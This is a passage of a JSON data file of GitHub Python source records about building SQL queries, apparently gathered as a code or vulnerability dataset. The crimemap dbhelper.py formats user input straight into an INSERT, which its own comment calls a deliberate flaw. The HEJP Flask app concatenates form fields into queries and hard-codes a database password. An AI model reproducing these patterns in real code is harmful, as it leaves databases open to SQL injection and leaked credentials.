lookup=self.lookup_name))\n\n\n@CharField.register_lookup\n@TextField.register_lookup\nclass CustomUnaccent(Unaccent):\n    has_unaccent = None\n    lookup_name = 'unaccent'\n\n    def as_sql(self, compiler, connection, **kwargs):\n        if CustomUnaccent.has_unaccent is None:\n            cursor = connection.cursor()\n            cursor.execute(\"SELECT COUNT(proname) FROM pg_proc WHERE proname = 'f_unaccent';\")\n            response = cursor.fetchone()\n            CustomUnaccent.has_unaccent = response and response[0] > 0\n        if CustomUnaccent.has_unaccent:\n            CustomUnaccent.function = 'F_UNACCENT'\n        return super().as_sql(compiler, connection, **kwargs)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cybojenix/py-libsalesforce/blob/82c3656e7aebacb61c682f2f49590c0686c86b73",
        "file_path": "/libsalesforce/query/__init__.py",
        "source": "from .api import get_query_manager\n\n__all__ = (\"get_query_manager\",)\n\n\n\"\"\"\nopportunity_qm = models.Opportunity.get_query_manager()\n\nopportunities = opportunity_qm.run(\n    {\n        'id': o.Id,\n        'accounts': [\n            {'id': a.Id}\n            for a in o.Accounts\n        ]\n    }\n    for o in opportunity_qm\n)\n\"\"\"\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cybojenix/py-libsalesforce/blob/82c3656e7aebacb61c682f2f49590c0686c86b73",
        "file_path": "/libsalesforce/query/construct.py",
        "source": "from typing import Iterator, TypeVar\n\nfrom .interface import ISpy\n\nT = TypeVar(\"T\")\n\n\ndef construct_select_statement(spy: ISpy, from_: str) -> str:\n    return f\"\"\"SELECT {', '.join(construct_selects(spy))} FROM {from_}\"\"\"\n\n\ndef construct_selects(spy: ISpy, current_name: str = \"\") -> Iterator[str]:\n    if spy.is_subquery:\n        yield construct_subquery(spy, name=current_name)\n    elif not spy.selected_fields:\n        yield current_name\n    else:\n        for field_name, field_spy in spy.selected_fields.items():\n            joined_name = f\"{current_name}.{field_name}\".lstrip(\".\")\n            yield from construct_selects(field_spy, joined_name)\n\n\ndef construct_subquery(spy: ISpy, name: str) -> str:\n    select_fields = _flatten(\n        construct_selects(field_spy, field_name)\n        for field_name, field_spy in spy.selected_fields.items()\n    )\n    return f\"\"\"(SELECT {', '.join(select_fields)} FROM {name})\"\"\"\n\n\ndef _flatten(iterables: Iterator[Iterator[T]]) -> Iterator[T]:\n    for iterable in iterables:\n        yield from iterable\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cybojenix/py-libsalesforce/blob/82c3656e7aebacb61c682f2f49590c0686c86b73",
        "file_path": "/libsalesforce/query/interface.py",
        "source": "from typing import Any, Dict, Iterator, TypeVar\n\nfrom typing_extensions import Protocol\n\nT = TypeVar(\"T\")\n\n\nclass SupportsSubQuery(Protocol):\n    def __iter__(self) -> \"Iterator[IRow]\":\n        ...\n\n\nclass SupportsFiltering(Protocol):\n    def filter(self, expression: bool) -> bool:\n        ...\n\n\nclass IRow(SupportsFiltering, SupportsSubQuery, Protocol):\n    def __getattr__(self, name: str) -> Any:\n        ...\n\n\nclass IQueryManager(Protocol):\n    def __iter__(self) -> Iterator[IRow]:\n        ...\n\n\nclass ISpy(IRow, Protocol):\n    selected_fields: \"Dict[str, ISpy]\"\n    is_subquery: bool\n\n\nclass IQueryModel(Protocol):\n    name: str\n\n\nclass IQueryClient(Protocol):\n    def query(self, query_string: str) -> Iterator[IRow]:\n        ...\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cybojenix/py-libsalesforce/blob/82c3656e7aebacb61c682f2f49590c0686c86b73",
        "file_path": "/libsalesforce/query/manager.py",
        "source": "from typing import Iterator, TypeVar\n\nfrom .construct import construct_select_statement\nfrom .interface import IRow\nfrom .spy import Spy\n\nT = TypeVar(\"T\")\n\n\nclass QueryManager:\n    def __init__(self, from_object: str, client):\n        self.from_object = from_object\n        self.client = client\n\n    def run(self, iterator: Iterator[T]) -> Iterator[T]:\n        # Currently we don't actually do much here.\n        # We need to drop the first element of the iterator, as this is\n        # where we used a Spy.\n        # While through magical powers at a future time, we could make the Spy\n        # actually change its stripes into actual data, it's more effort than it's\n        # worth.\n\n        # As we could have a list or generator, we should change to an iterator to have\n        # a common interface to work with.\n        iterator = iter(iterator)\n        next(iterator)  # discards\n        return iterator\n\n    def __iter__(self) -> Iterator[IRow]:\n        # We need to find out what fields are being requested\n        spy = Spy()\n        yield spy\n\n        # Now we've collected all access points, turn it into an SOQL statement\n        query_string = construct_select_statement(spy, self.from_object)\n        print(query_string)\n\n        # The client can take over from here, as that is in charge of fetching + building objects.\n        yield from self.client.query(query_string)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/cybojenix/py-libsalesforce/blob/82c3656e7aebacb61c682f2f49590c0686c86b73",
        "file_path": "/libsalesforce/query/spy.py",
        "source": "from collections import defaultdict\nfrom typing import Dict, Iterator, TypeVar\n\nfrom .interface import ISpy\n\nT = TypeVar(\"T\", bound=ISpy)\n\n\nclass Spy:\n    selected_fields: Dict[str, ISpy]\n    is_subquery: bool\n\n    def __init__(self):\n        self.selected_fields = defaultdict(self.__class__)\n        self.is_subquery = False\n\n    def __getattr__(self, name: str) -> ISpy:\n        return self.selected_fields[name]\n\n    def __iter__(self: T) -> Iterator[T]:\n        self.is_subquery = True\n        yield self\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/JeremiahO/crimemap/blob/e8c4ac93bbb4a3d8081fced2245016d16e82d869",
        "file_path": "/dbhelper.py",
        "source": "import sys\n# sys.path.append(\"/root/.local/lib/python2.7/site-packages\")\n\nimport pymysql\nimport pymysql.cursors\nimport dbconfig\n\n# The four main database operations CRUD - Create. Read. Update. Delete\n\n\nclass DBHelper:\n\n    #   --- CREATE --- Create and Insert New Data\n\n    def connects(self, database=\"crimemap\"):\n        try:\n            conn = pymysql.connect(host='localhost',\n                                   user=dbconfig.db_user,\n                                   password=dbconfig.db_password,\n                                   db=database,\n                                   charset='utf8mb4',\n                                   cursorclass=pymysql.cursors.DictCursor)\n        except Exception as e:\n            print(e)\n        return conn\n    # --- READ --- Read Exsiting Data\n\n    def get_all_inputs(self):\n        connection = self.connects()\n        try:\n            query = \"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n    # --- UPDATE --- Modify Existing Data\n\n    def add_input(self, data):\n        connection = self.connects()\n        try:\n            # The following introduces a deliberate security flaw. See section on SQL injecton below\n            query = \"INSERT INTO crimes (description) VALUES ('{}');\".format(\n                data)\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n    # --- DELETE --- Delete Exsising Data\n\n    def clear_all(self):\n        connection = self.connects()\n        try:\n            query = \"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/AlgoWit/sports-betting/blob/8b7a99ba1ff030d28dc6629a1f6dddb3dbb01fce",
        "file_path": "/sportsbet/soccer/data.py",
        "source": "#!/usr/bin/env python3\n\n\"\"\"\nDownload and prepare training and fixtures data \nfrom various leagues.\n\"\"\"\n\nfrom os.path import join\nfrom itertools import product\nfrom difflib import SequenceMatcher\nfrom sqlite3 import connect\nfrom argparse import ArgumentParser, RawDescriptionHelpFormatter\n\nfrom scipy.stats import hmean\nimport numpy as np\nimport pandas as pd\n\nfrom sportsbet import SOCCER_PATH\nfrom sportsbet.soccer import TARGET_TYPES_MAPPING\n\nDB_CONNECTION = connect(join(SOCCER_PATH, 'soccer.db'))\nLEAGUES_MAPPING = {\n    'E0': 'Barclays Premier League',\n    'B1': 'Belgian Jupiler League',\n    'N1': 'Dutch Eredivisie',\n    'E1': 'English League Championship',\n    'E2': 'English League One',\n    'E3': 'English League Two',\n    'F1': 'French Ligue 1',\n    'F2': 'French Ligue 2',\n    'D1': 'German Bundesliga',\n    'D2': 'German 2. Bundesliga',\n    'G1': 'Greek Super League',\n    'I1': 'Italy Serie A',\n    'I2': 'Italy Serie B',\n    'P1': 'Portuguese Liga',\n    'SC0': 'Scottish Premiership',\n    'SP1': 'Spanish Primera Division',\n    'SP2': 'Spanish Segunda Division',\n    'T1': 'Turkish Turkcell Super Lig'\n}\n\n\ndef combine_odds(odds, target_types):\n    \"\"\"Combine odds of different betting types.\"\"\"\n    combined_odds = 1 / pd.concat([1 / odds[target_type] for target_type in target_types], axis=1).sum(axis=1)\n    combined_odds.name = '+'.join(target_types)\n    return pd.concat([odds, combined_odds], axis=1)\n\n\ndef check_leagues_ids(leagues_ids):\n    \"\"\"Check correct leagues ids input.\"\"\"\n    \n    # Set error message\n    leagues_ids_error_msg = 'Parameter `leagues_ids` should be equal to `all` or a list that contains any of %s elements. Got %s instead.' % (', '.join(LEAGUES_MAPPING.keys()), leagues_ids)\n\n    # Check types\n    if not isinstance(leagues_ids, (str, list)):\n        raise TypeError(leagues_ids_error_msg)\n    \n    # Check values\n    if leagues_ids != 'all' and not set(LEAGUES_MAPPING.keys()).issuperset(leagues_ids):\n        raise ValueError(leagues_ids_error_msg)\n    \n    leagues_ids = list(LEAGUES_MAPPING.keys()) if leagues_ids == 'all' else leagues_ids[:]\n\n    return leagues_ids\n\n\ndef create_spi_tables(leagues_ids):\n    \"\"\"Download spi data and save them to database.\"\"\"\n\n    # Check leagues ids\n    leagues_ids = check_leagues_ids(leagues_ids)\n\n    # Download data\n    spi = pd.read_csv('https://projects.fivethirtyeight.com/soccer-api/club/spi_matches.csv').drop(columns=['league_id'])\n\n    # Cast to date\n    spi['date'] = pd.to_datetime(spi['date'], format='%Y-%m-%d')\n\n    # Filter leagues\n    leagues = [LEAGUES_MAPPING[league_id] for league_id in leagues_ids]\n    spi = spi[spi['league'].isin(leagues)]\n\n    # Convert league names to ids\n    inverse_leagues_mapping = {league: league_id for league_id, league in LEAGUES_MAPPING.items()}\n    spi['league'] = spi['league'].apply(lambda league: inverse_leagues_mapping[league])\n\n    # Filter matches\n    mask = (~spi['score1'].isna()) & (~spi['score2'].isna())\n    spi_historical, spi_fixtures = spi[mask], spi[~mask]\n\n    # Save tables\n    for name, df in zip(['spi_historical', 'spi_fixtures'], [spi_historical, spi_fixtures]):\n        df.to_sql(name, DB_CONNECTION, index=False, if_exists='replace')\n\n\ndef create_fd_tables(leagues_ids):\n    \"\"\"Download fd data and save them to database.\"\"\"\n\n    # Define parameters\n    base_url = 'http://www.football-data.co.uk'\n    cols = ['Date', 'Div', 'HomeTeam', 'AwayTeam']\n    features_cols = ['BbAvH', 'BbAvA', 'BbAvD', 'BbAv>2.5', 'BbAv<2.5', 'BbAHh' , 'BbAvAHH', 'BbAvAHA']\n    odds_cols = ['PSH', 'PSA', 'PSD', 'BbMx>2.5', 'BbMx<2.5', 'BbAHh', 'BbMxAHH', 'BbMxAHA']\n    seasons = ['1617', '1718', '1819']\n\n    # Check leagues ids\n    leagues_ids = check_leagues_ids(leagues_ids)\n\n    # Download historical data\n    fd_historical = []\n    for league_id, season in product(leagues_ids, seasons):\n        data = pd.read_csv(join(base_url, 'mmz4281', season, league_id), usecols=cols + features_cols + odds_cols)\n        data['Date'] = pd.to_datetime(data['Date'], dayfirst=True)\n        data['season'] = season\n        fd_historical.append(data)\n    fd_historical = pd.concat(fd_historical, ignore_index=True)\n\n    # Download fixtures data\n    fd_fixtures = pd.read_csv(join(base_url, 'fixtures.csv'), usecols=cols + features_cols + odds_cols)\n    fd_fixtures['Date'] = pd.to_datetime(fd_fixtures['Date'], dayfirst=True)\n    fd_fixtures = fd_fixtures[fd_fixtures['Div'].isin(leagues_ids)]\n\n    # Save tables\n    for name, df in zip(['fd_historical', 'fd_fixtures'], [fd_historical, fd_fixtures]):\n        df.to_sql(name, DB_CONNECTION, index=False, if_exists='replace')\n\n\ndef create_names_mapping_table():\n    \"\"\"Create names mapping table.\"\"\"\n\n    # Load data\n    left_data = pd.read_sql('select date, league, team1, team2 from spi_historical', DB_CONNECTION)\n    right_data = pd.read_sql('select Date, Div, HomeTeam, AwayTeam from fd_historical', DB_CONNECTION)\n\n    # Rename columns\n    key_columns = ['key0', 'key1']\n    left_data.columns = key_columns + ['left_team1', 'left_team2']\n    right_data.columns = key_columns + ['right_team1', 'right_team2']\n\n    # Generate teams names combinations\n    names_combinations = pd.merge(left_data, right_data, how='outer').dropna().drop(columns=key_columns).reset_index(drop=True)\n\n    # Calculate similarity index\n    similarity = names_combinations.apply(lambda row: SequenceMatcher(None, row.left_team1, row.right_team1).ratio() * SequenceMatcher(None, row.left_team2, row.right_team2).ratio(), axis=1)\n\n    # Append similarity index\n    names_combinations_similarity = pd.concat([names_combinations, similarity], axis=1)\n\n    # Filter correct matches\n    indices = names_combinations_similarity.groupby(['left_team1', 'left_team2'])[0].idxmax().values\n    names_matching = names_combinations.take(indices)\n\n    # Teams matching\n    matching1 = names_matching.loc[:, ['left_team1', 'right_team1']].rename(columns={'left_team1': 'left_team', 'right_team1': 'right_team'})\n    matching2 = names_matching.loc[:, ['left_team2', 'right_team2']].rename(columns={'left_team2': 'left_team', 'right_team2': 'right_team'})\n        \n    # Combine matching\n    matching = matching1.append(matching2)\n    matching = matching.groupby(matching.columns.tolist()).size().reset_index()\n    indices = matching.groupby('left_team')[0].idxmax().values\n        \n    # Generate mapping\n    names_mapping = matching.take(indices).drop(columns=0).reset_index(drop=True)\n\n    # Save table\n    names_mapping.to_sql('names_mapping', DB_CONNECTION, index=False, if_exists='replace')\n\n\ndef create_modeling_tables():\n    \"\"\"Create tables for machine learning modeling.\"\"\"\n\n    # Define parameters\n    spi_keys = ['date', 'league', 'team1', 'team2']\n    fd_keys = ['Date', 'Div', 'HomeTeam', 'AwayTeam']\n    input_cols = ['spi1', 'spi2', 'prob1', 'prob2', 'probtie', 'proj_score1', 'proj_score2', 'importance1', 'importance2', 'BbAvH', 'BbAvA', 'BbAvD', 'BbAv>2.5', 'BbAv<2.5', 'BbAHh', 'BbAvAHH', 'BbAvAHA']\n    output_cols = ['score1', 'score2', 'xg1', 'xg2', 'nsxg1', 'nsxg2', 'adj_score1', 'adj_score2']\n    odds_cols_mapping = {'PSH': 'H', 'PSA': 'A', 'PSD': 'D', 'BbMx>2.5': 'over_2.5', 'BbMx<2.5': 'under_2.5', 'BbAHh': 'handicap', 'BbMxAHH': 'handicap_home', 'BbMxAHA': 'handicap_away'}\n    \n    # Load data\n    data = {}\n    for name in ('spi_historical', 'spi_fixtures', 'fd_historical', 'fd_fixtures', 'names_mapping'):\n        parse_dates = ['date'] if name in ('spi_historical', 'spi_fixtures') else ['Date'] if name in ('fd_historical', 'fd_fixtures') else None\n        data[name] = pd.read_sql('select * from %s' % name, DB_CONNECTION, parse_dates=parse_dates)\n\n    # Rename teams\n    for col in ['team1', 'team2']:\n        for name in ('spi_historical', 'spi_fixtures'):\n            data[name] = pd.merge(data[name], data['names_mapping'], left_on=col, right_on='left_team', how='left').drop(columns=[col, 'left_team']).rename(columns={'right_team': col})\n\n    # Combine data\n    historical = pd.merge(data['spi_historical'], data['fd_historical'], left_on=spi_keys, right_on=fd_keys).dropna(subset=odds_cols_mapping.keys(), how='any').reset_index(drop=True)\n    fixtures = pd.merge(data['spi_fixtures'], data['fd_fixtures'], left_on=spi_keys, right_on=fd_keys)\n\n    # Extract training, odds and fixtures\n    X = historical.loc[:, ['season'] + spi_keys + input_cols]\n    y = historical.loc[:, output_cols]\n    odds = historical.loc[:, spi_keys + list(odds_cols_mapping.keys())].rename(columns=odds_cols_mapping)\n    X_test = fixtures.loc[:, spi_keys + input_cols]\n    odds_test = fixtures.loc[:, spi_keys + list(odds_cols_mapping.keys())].rename(columns=odds_cols_mapping)\n\n    # Add average scores columns\n    for ind in (1, 2):\n        y['avg_score%s' % ind] =  y[['score%s' % ind, 'xg%s' % ind, 'nsxg%s' % ind]].mean(axis=1)\n\n    # Add combined odds columns\n    for target_type in TARGET_TYPES_MAPPING.keys():\n        if '+' in target_type:\n            target_types = target_type.split('+')\n            odds = combine_odds(odds, target_types)\n            odds_test = combine_odds(odds_test, target_types)\n\n    # Feature extraction\n    with np.errstate(divide='ignore',invalid='ignore'):\n        for df in (X, X_test):\n            df['quality'] = hmean(df[['spi1', 'spi2']], axis=1)\n            df['importance'] = df[['importance1', 'importance2']].mean(axis=1)\n            df['rating'] = df[['quality', 'importance']].mean(axis=1)\n            df['sum_proj_score'] = df['proj_score1'] + df['proj_score2']\n\n    # Save tables\n    for name, df in zip(['X', 'y', 'odds', 'X_test', 'odds_test'], [X, y, odds, X_test, odds_test]):\n        df.to_sql(name, DB_CONNECTION, index=False, if_exists='replace')\n\n\ndef download():\n    \"\"\"Command line function to download data and update database.\"\"\"\n    \n    # Create parser description\n    description = 'Select the leagues parameter from the following leagues:\\n\\n'\n    for league_id, league_name in LEAGUES_MAPPING.items():\n        description += '{} ({})\\n'.format(league_id, league_name)\n\n    # Create parser\n    parser = ArgumentParser(description=description, formatter_class=RawDescriptionHelpFormatter)\n\n    # Add arguments\n    parser.add_argument('leagues', nargs='*', default=['all'], help='One of all or any league ids from above.')\n    \n    # Parse arguments\n    args = parser.parse_args()\n\n    # Adjust parameter\n    leagues = args.leagues\n    if len(leagues) == 1 and leagues[0] == 'all':\n        leagues = leagues[0]\n\n    # Create tables\n    for ind, func in enumerate([create_spi_tables, create_fd_tables, create_names_mapping_table, create_modeling_tables]):\n        func(leagues) if ind in (0, 1) else func()\n\n    \n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/tjhickey724/HEJP/blob/d78db5a076158b31873bd0adeea2b0997f06a6d5",
        "file_path": "/hejp.py",
        "source": "import os\nfrom flask import Flask\nfrom flask import redirect\nfrom flask import render_template\nfrom flask import request\nimport psycopg2\nimport timeit\n\nfrom fieldValues import faculty_status, fields_of_study, departments, careerareas,ipedssectornames\n\nfrom occupations import occupations\n\nproject_dir = os.path.dirname(os.path.abspath(__file__))\n\n\napp = Flask(__name__,\n            static_url_path='',\n            static_folder='static')\n\n\n\n\nquery1 = \"SELECT year,faculty, count(*) as N from hej where faculty=1 group by faculty,year;\"\n\n\n@app.route('/',methods=[\"GET\"])\ndef home():\n    return render_template(\"home.html\")\n\n\n@app.route('/demo1', methods=[\"GET\", \"POST\"])\ndef demo1():\n    z = demo(6)\n    return render_template(\"demo1.html\", query=query1, rows=z)\n\n@app.route('/demo2', methods=[\"GET\", \"POST\"])\ndef demo2():\n    z = demo(1)\n    results = [[x[0],x[1],x[2]] for x in z]\n    return render_template(\"demo2.html\", query=query1, rows=results)\n\n@app.route('/facnonfac', methods=[\"GET\", \"POST\"])\ndef facnonfac():\n    z = demo(1)\n    results = [[x[0],x[1],x[2]] for x in z]\n    return render_template(\"demo2.html\", query=query1, rows=results)\n\n@app.route('/chartdemo', methods=[\"GET\",\"POST\"])\ndef chartdemo():\n    if request.method==\"GET\":\n        return render_template(\"chartdemoForm.html\",ipedssectornames=ipedssectornames)\n    else:\n        print(request.form)\n        year = request.form.getlist('year')\n        ipeds = request.form.getlist('ipedssectornames')\n        query = \"SELECT hej.year,hej.faculty+2*hej.postdoctoral as facStatus,count(*) from hej,maintable where (hej.jobid=maintable.jobid) and \"\n        query += makeYears(year)+\" and \"\n        query += makeStrings('ipedssectorname',ipeds)\n        query += \" group by hej.year, facStatus\"\n        print(query)\n        z = queryAll(query)\n        print(\"Results of query are:\")\n        if (z==[]):\n            print(\"no results\")\n            return render_template(\"noResults.html\",query=query)\n        else:\n            print(z)\n        years = [int(y) for y in year]\n        r = [(y,list(a[2] for a in [b for b in z if b[1]==y])) for y in [0,1,2]]\n        print(\"r=\")\n        print(r)\n        print('years='+str(years))\n        return render_template(\"chartdemoResult.html\",\n                  ipedssectornames=ipedssectornames,\n                  query=query, years=years, z=z, r=r)\n\n\n\n@app.route('/chartdemoORIG', methods=[\"GET\"])\ndef chartdemoORIG():\n    return render_template(\"chartdemoORIG.html\")\n\n\n@app.route('/demo4', methods=[\"GET\", \"POST\"])\ndef demo4():\n    print(\"in demo4\")\n    if request.method==\"GET\":\n        return render_template(\"demo4.html\",ipedssectornames=ipedssectornames)\n    else:\n        print(request.form)\n        year = request.form.getlist('year')\n        ipeds = request.form.getlist('ipedssectornames')\n        query = \"SELECT count(*) from hej,maintable where (hej.jobid=maintable.jobid) and \"\n        query += makeYears(year)+\" and \"\n        query += makeStrings('ipedssectorname',ipeds)\n        query += \" group by hej.year\"\n        print(query)\n        z = queryAll(query)\n        print(z)\n        if (z==[]):\n            print(\"no results\")\n            return render_template(\"noResults.html\",query=query)\n        z1 = [x[0] for x in z]\n        z2 = [makeObj(x) for x in z1]\n        vals = []\n        for i in range(0,len(year)):\n            vals += [makeObj2(year[i],z1[i])]\n\n        print(z)\n        print(z1)\n        print(z2)\n        print(vals)\n        years = [int(y) for y in year]\n        return render_template(\"demo4b.html\", query=query, year=years, z1=z1)\n\n\n\n@app.route('/demo3', methods=[\"GET\", \"POST\"])\ndef demo3():\n    if request.method==\"GET\":\n        return render_template(\"demo3.html\",faculty_status=faculty_status,fields_of_study=fields_of_study, departments=departments,careerareas=careerareas,ipedssectornames=ipedssectornames,occupations=occupations)\n    else:\n        print(request.form)\n        jobtype = request.form.getlist('jobtype')\n        staff = request.form.getlist('staff')\n        fac = request.form.getlist('fac')\n        year = request.form.getlist('year')\n        fos = request.form.getlist('fos')\n        dept = request.form.getlist('dept')\n        divinc = request.form.getlist('diversityandinclusion')\n        rsh1 = request.form.getlist('isresearch1institution')\n        careerarea = request.form.getlist('careerarea')\n        ipeds = request.form.getlist('ipedssectornames')\n        occs = request.form.getlist('occupations')\n        min_ed = request.form.get('minimumedurequirements')\n        max_ed = request.form.get('maximumedurequirements')\n        min_exp = request.form.get('minimumexperiencerequirements')\n        print('min ed = '+min_ed)\n        query = \"SELECT count(*) from hej,maintable where (hej.jobid=maintable.jobid) and \"\n        query += makeBoolean(jobtype)+\" and \"\n        if (staff!=[]):\n          query += \" (faculty=0 and postdoctoral=0) and \"\n        query += makeBoolean(fos)+\" and \"\n        query += makeYears(year)+\" and \"\n        query += makeBoolean(dept)+\" and \"\n        query += makeBoolean(fac) + \" and \"\n        query += makeBoolean(divinc+rsh1) + \" and \"\n        query += makeCareerAreas(careerarea) + \" and \"\n        query += makeStrings('ipedssectorname',ipeds) + \" and \"\n        query += makeStrings('occupation',occs) + \" and \"\n        query += \"minimumedurequirements >= \"+min_ed+\" and \"\n        query += \"maximumedurequirements <= \"+max_ed+\" and \"\n        query += \"minimumexperiencerequirements >= \"+min_exp\n        query += \" group by hej.year\"\n        print(query)\n        z = queryAll(query)\n        print(z)\n        if (z==[]):\n            print(\"no results\")\n            return render_template(\"noResults.html\",query=query)\n        z1 = [x[0] for x in z]\n        z2 = [makeObj(x) for x in z1]\n        vals = []\n        for i in range(0,len(year)):\n            vals += [makeObj2(year[i],z1[i])]\n\n        print(z)\n        print(z1)\n        print(z2)\n        print(vals)\n        years = [int(y) for y in year]\n        return render_template(\"demo3b.html\", query=query, year=years, z1=z1)\n\n\n\ndef makeObj(x):\n    z={}\n    z[\"date\"]=\"1-May-12\"\n    z[\"close\"]=x\n    return z\ndef makeObj2(y,x):\n    z={}\n    z[\"date\"]=\"1-Jan-\"+str(y)\n    z[\"close\"]=x\n    return z\n\ndef makeBoolean(list):\n    if (list==[]):\n        return \"true\"\n    result = \"(\"\n    for i in range(0,len(list)-1):\n        result+= list[i]+\"=1 or \"\n    result += list[len(list)-1]+\" = 1 ) \"\n    return result\n\ndef makeYears(list):\n    if (list==[]):\n        return \"true\"\n    result = \"(\"\n    for i in range(0,len(list)-1):\n        result+= \" hej.year = \"+list[i]+\" or \"\n    result += \" hej.year = \"+ list[len(list)-1]+\" ) \"\n    return result\n\ndef makeCareerAreas(list):\n    if (list==[]):\n        return \"true\"\n    result = \"(\"\n    for i in range(0,len(list)-1):\n        result+= \" maintable.careerarea = '\"+list[i]+\"' or \"\n    result += \" maintable.careerarea = '\"+ list[len(list)-1]+\"' ) \"\n    print('result is '+result)\n    return result\n\ndef makeStrings(columnname,list):\n    print(\"in makeStrings\")\n    print(list)\n    if (list==[]):\n        return \"true\"\n    result = \"(\"\n    for i in range(0,len(list)-1):\n        result+= \" \"+columnname + \" = '\"+list[i]+\"' or \"\n    result += \" \"+columnname + \" = '\"+ list[len(list)-1]+\"' ) \"\n    print('result is '+result)\n    return result\n\ndef demo(n):\n    switcher = {\n    1: \"SELECT year,faculty, count(*) as N from hej where faculty=1 group by faculty,year;\",\n    2: \"SELECT fulltimecontingent, count(*) from hej where year =2010 group by  fulltimecontingent\",\n    3: \"SELECT parttimecontingent, count(*) from hej where year =2010 group by  parttimecontingent\",\n    4: \"SELECT year,count(*) from hej where (tenured=1 or tenured_track=1) group by year;\",\n    5: \"SELECT count(*) from hej where (tenured = 1 or tenured_track =1) and (year=2007 or year=2012 or year=2017) group by year\",\n    6: \"SELECT count(*) as N, maintable.minimumedurequirements as R from hej,maintable where (hej.jobid=maintable.jobid) and (hej.faculty = 1) and (hej.year>= 2010) group by maintable.minimumedurequirements\"\n    }\n    z = queryAll(switcher.get(n,0))\n    return z\n\ndef queryAll(query):\n    \"\"\" Connect to the PostgreSQL database server \"\"\"\n    conn = None\n    result = None\n    try:\n        # read connection parameters\n        conn_string = \"host='localhost' dbname='data1000' user='postgres' password='postgres'\"\n\n\n        # connect to the PostgreSQL server\n        print('Connecting to the PostgreSQL database...')\n        conn = psycopg2.connect(conn_string)\n\n        # create a cursor\n        cur = conn.cursor()\n\n # execute a statement\n        cur.execute(query)\n\n        # display the PostgreSQL database server version\n        result = cur.fetchall()\n        print(result)\n\n     # close the communication with the PostgreSQL\n        cur.close()\n    except (Exception, psycopg2.DatabaseError) as error:\n        print(error)\n    finally:\n        if conn is not None:\n            conn.close()\n            print('Database connection closed.')\n        return result\n\n\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/SpartaHack/SpartaHack-API/blob/b0d71ba8da8aa1c1c7e394ea63cf2c0b95443f25",
        "file_path": "/app.py",
        "source": "from flask import Flask, jsonify, make_response,request, g\nfrom flask_restful import Api\nfrom celery import Celery\nfrom sqlalchemy.ext.automap import automap_base\nfrom sqlalchemy import create_engine\nfrom sqlalchemy.orm import Session\nfrom common.utils import unauthorized,headers,not_found\n\nfrom config import load_env_variables, DevelopmentConfig, ProdConfig\n\n#loading environment variables\nload_env_variables()\n\napp = Flask(__name__)\napp.config.from_object(DevelopmentConfig)#loading config data into flask app from config object.\napi = Api(app)\n\n#reflecting classes\nprint(\"Reflecting classes...\")\nBase = automap_base()\nengine = create_engine(app.config[\"SQLALCHEMY_DATABASE_URI\"],pool_size=20,max_overflow=20,pool_pre_ping=True)\nBase.prepare(engine, reflect=True)\nprint(\"Classes reflected...\")\n\n\n@app.before_request\ndef create_session():\n    \"\"\"\n    Before processing any request. Create a session by checking out a connection from the connection pool.\n    Also set request global variables to be accessed for the life time of the request\n\n    \"\"\"\n    g.session = Session(engine)\n    g.Base = Base\n\n@app.after_request\ndef commit_and_close_session(resp):\n    \"\"\"\n    After all the processing is done. Commit the changes and close the session to return the connection object back to the connection pool.\n    \"\"\"\n    g.session.commit()\n    g.session.close()\n    return resp\n\n#loading resources\nfrom resources.faqs import Faqs_RUD, Faqs_CR\nfrom resources.announcements import Announcements_RUD, Announcements_CR\nfrom resources.hardware import Hardware_RUD, Hardware_CR\nfrom resources.sponsors import Sponsor_RD, Sponsor_CR\nfrom resources.schedule import Schedule_RUD, Schedule_CR\nfrom resources.applications import Applications_RU, Applications_CR\n\n@api.representation('application/json')\ndef ret_json(data, code, headers=None):\n    \"\"\"\n    Create proper request object based on the return dictionary.\n    \"\"\"\n    if code == 204:\n        resp = make_response('', code)\n    else:\n        resp = make_response(jsonify(data), code)\n    resp.headers.extend(headers)\n    return resp\n\n#might only need this for email sending so that email sending does not clog up the resources\ntask_queue=Celery(\"SpartaHack_API_2019\",broker=app.config[\"CELERY_BROKER_URL\"])\n\n#adding resources. Just flask-restful things :)\napi.add_resource(Faqs_RUD,\"/faqs/<int:faq_id>\")\napi.add_resource(Faqs_CR,\"/faqs\")\napi.add_resource(Announcements_RUD,\"/announcements/<int:announcement_id>\")\napi.add_resource(Announcements_CR,\"/announcements\")\napi.add_resource(Hardware_RUD,\"/hardware/<int:hardware_id>\")\napi.add_resource(Hardware_CR,\"/hardware\")\napi.add_resource(Sponsor_RD,\"/sponsors/<int:sponsor_id>\")\napi.add_resource(Sponsor_CR,\"/sponsors\")\napi.add_resource(Schedule_RUD,\"/schedule/<int:schedule_id>\")\napi.add_resource(Schedule_CR,\"/schedule\")\napi.add_resource(Applications_RU,\"/applications/<int:application_id>\")\napi.add_resource(Applications_CR,\"/applications\")\n\n\n@app.route(\"/\")\ndef helloworld():\n    \"\"\"\n    For flask app test and general info about the API.\n    Will also be used to check if the api is live or not on the slack hook\n    \"\"\"\n    metadata = {\n                \"Organization\":\"SpartaHack\",\n                \"Backend Developers\":\"Yash, Jarek\",\n                \"Frontend Developers\":\"Harrison, Jessica, Jarek\",\n                \"Contact\":\"hello@spartahack.com\",\n                \"Version\":\"0.5.0\"\n               }\n    return (metadata,200,headers)\n\n\nif __name__ == '__main__': #running on local server. This needs to change for prod\n    app.run(debug=True)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/SpartaHack/SpartaHack-API/blob/b0d71ba8da8aa1c1c7e394ea63cf2c0b95443f25",
        "file_path": "/common/json_schema.py",
